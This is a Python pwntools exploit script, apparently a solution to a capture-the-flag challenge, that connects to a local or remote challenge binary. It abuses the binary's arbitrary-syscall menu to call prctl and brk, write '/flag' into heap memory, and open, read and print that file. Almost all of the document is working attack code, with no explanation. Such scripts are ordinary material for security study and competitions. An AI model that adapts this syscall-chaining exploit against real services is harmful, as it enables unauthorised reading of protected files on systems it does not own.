from pwn import *
from pwnlib import constants
#from LibcSearcher import *
#from libcfind import *

local = 1
pc = './rootfs/chal'
aslr = True
context.log_level = "debug"
#context.terminal = ["deepin-terminal","-m","splitscreen","-e","bash","-c"]
context.terminal = ['tmux','splitw','-h']
context.arch = "amd64"
context.os = "linux"

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(pc)

if local == 1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc,aslr=aslr)
else:
    remote_addr = ['node4.buuoj.cn', 6666]
    p = remote(remote_addr[0], remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    log.critical("{} -> {}".format(s, hex(addr)))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8, b'\x00'))
    else:
        return u64(rl().strip().ljust(8,b'\x00'))


def Invoke():
    ru("3. Exit\n")
    sl("2")

def _syscall(sys_no, a1, a2, a3):
    ru('3. Invoke the Forbidden Runes\n')
    sl('3')
    ru("60 3 3 3): ")
    sl(f"{sys_no} {a1} {a2} {a3}")

def Strike():
    ru('3. Invoke the Forbidden Runes\n')
    sl('1')


if __name__ == "__main__":
    ru("tell me your name: ")
    sl('aaa')

    '''
    linux/prctl.h:#define PR_SET_MDWE               65
    linux/prctl.h:#define PR_MDWE_REFUSE_EXEC_GAIN  (1UL << 0)
    '''
    Invoke()
    _syscall(int(constants.SYS_prctl), 65, 1, 0)
    Strike()

    Invoke()
    _syscall(int(constants.SYS_brk), 0, 0, 0)
    ru("answers: ")
    brk = int(rl().strip())
    lg("brk", brk)

    _syscall(int(constants.SYS_brk), brk+0x1000, 0, 0)
    ru("answers: ")
    res = int(rl().strip())
    lg("res", res)

    _syscall(int(constants.SYS_read), 0, brk, 8)
    sleep(0.5)
    sn(b"/flag\x00")

    _syscall(int(constants.SYS_open), brk, 0, int(constants.PROT_READ))
    ru("answers: ")
    fd = int(rl().strip())
    lg("fd", fd)

    _syscall(int(constants.SYS_read), fd, brk+0x10, 0x30)
    ru("answers: ")
    res = int(rl().strip())
    lg("res", res)

    _syscall(int(constants.SYS_write), 1, brk+0x10, res)
    log.critical(rl().strip())

    p.interactive()

